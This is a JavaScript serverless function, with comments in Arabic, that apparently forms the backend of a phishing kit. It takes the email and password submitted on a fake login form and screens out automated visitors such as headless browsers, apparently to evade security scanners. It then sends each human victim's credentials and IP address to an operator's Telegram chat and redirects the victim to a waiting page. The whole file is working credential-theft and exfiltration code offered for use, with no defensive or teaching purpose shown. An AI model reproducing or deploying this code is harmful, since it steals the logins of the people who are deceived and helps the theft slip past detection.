const fetch = require('node-fetch');

// دالة مساعدة لجلب IP من رؤوس مختلفة
const getClientIp = (headers) => {
    return headers['x-nf-client-connection-ip'] || 
           headers['client-ip'] || 
           headers['x-forwarded-for'] ||
           'غير متوفر';
};

// دالة ترميز الأحرف الخاصة بـ MarkdownV2 لـ Telegram
const escapeMarkdownV2 = (text) => {
    const replacements = {
        '\\': '\\\\', '_': '\\_', '*': '\\*', '[': '\\[', ']': '\\]', 
        '(': '\\(', ')': '\\)', '~': '\\~', '`': '\\`', '>': '\\>', 
        '#': '\\#', '+': '\\+', '-': '\\-', '=': '\\=', '|': '\\|', 
        '{': '\\{', '}': '\\}', '.': '\\.', '!': '\\!'
    };
    return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => replacements[match]);
};


exports.handler = async (event, context) => {
    
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }
    
    const bodyParams = new URLSearchParams(event.body);
    
    const email = bodyParams.get('login_email') || 'غير متوفر';
    const password = bodyParams.get('login_password') || 'غير متوفر';
    const fingerprintJSON = bodyParams.get('security_fingerprint'); 
    const ip = getClientIp(event.headers); 

    // ----------------------------------------------------------------
    // 1. تحليل بيانات البصمة وتطبيق الحظر (Logic Block)
    // ----------------------------------------------------------------
    let fpData = null;
    let securityStatus = "✅ CLEAN";
    let isBlocked = false;

    try {
        fpData = JSON.parse(fingerprintJSON);
        
        // أ. فحص التفاعل البشري (حظر إذا لم يكن هناك تفاعل)
        if (fpData.isHuman === false) {
            securityStatus = "❌ BLOCKED - No Interaction";
            isBlocked = true;
        } 
        
        // ب. فحص خصائص الأتمتة (حظر صارم للـ Webdriver/Headless)
        // قد نستخدم شروطاً أكثر صرامة للحظر هنا
        if (fpData.webdriver !== "N/A" || fpData.headless === "Yes") {
            securityStatus = "❌ BLOCKED - Automation Detected";
            isBlocked = true;
        }

    } catch (e) {
        // إذا فشل تحليل بيانات البصمة (كأن تكون معدومة)، نعتبرها محاولة مشبوهة
        securityStatus = "❌ BLOCKED - Invalid FP Data";
        isBlocked = true; 
    }

    // ----------------------------------------------------------------
    // 2. تطبيق الحظر الصارم (Block and Redirect without Telegram Alert)
    // ----------------------------------------------------------------
    if (isBlocked) {
        // لا يتم إرسال أي رسالة Telegram هنا.
        // يتم تسجيل الحظر داخلياً فقط (لـ Netlify Logs)
        console.log(`[BLOCKED] Bot detected: ${securityStatus} from IP: ${ip}`);
        
        // يتم التحويل إلى صفحة الانتظار أو تسجيل الدخول مرة أخرى
        return {
            statusCode: 303,
            headers: {
                Location: '/waiting.html', 
            },
        };
    }

    // ----------------------------------------------------------------
    // 3. معالجة الزوار الحقيقيين (Human - Send Telegram Alert)
    // ----------------------------------------------------------------
    
    const safe_email = escapeMarkdownV2(email);
    const safe_password = escapeMarkdownV2(password);
    const safe_ip = escapeMarkdownV2(ip);

    let fpDetails = '';
    if (fpData) {
        // إضافة بعض التفاصيل عن البصمة لتأكيد السلامة
        fpDetails += `Human: ${fpData.isHuman ? 'Yes' : 'No'}\n`;
        fpDetails += `Interaction Count: ${fpData.interactionCount}\n`;
        fpDetails = escapeMarkdownV2(fpDetails);
    }

    // تشكيل الرسالة
    let message_text = `👤 *Login Data \\(Donsaa\\)* 👤\n\n`;
    message_text += `*STATUS: ${securityStatus}*\n\n`;
    message_text += `E\\-Mail: \`${safe_email}\`\n`;
    message_text += `Passwort: \`${safe_password}\`\n`;
    message_text += `IP: \`${safe_ip}\`\n\n`;
    message_text += `*FP Details:*\n`;
    message_text += `${fpDetails}`;

    // إعدادات Telegram
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const data = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message_text,
            parse_mode: 'MarkdownV2',
        };
        // إرسال البيانات إلى Telegram (يتم فقط إذا لم يتم حظر الزائر)
        try {
            await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (error) {
            console.error("Error sending message to Telegram:", error);
        }
    }

    // التحويل إلى صفحة الانتظار
    return {
        statusCode: 303,
        headers: {
            Location: '/waiting.html',
        },
    };
};
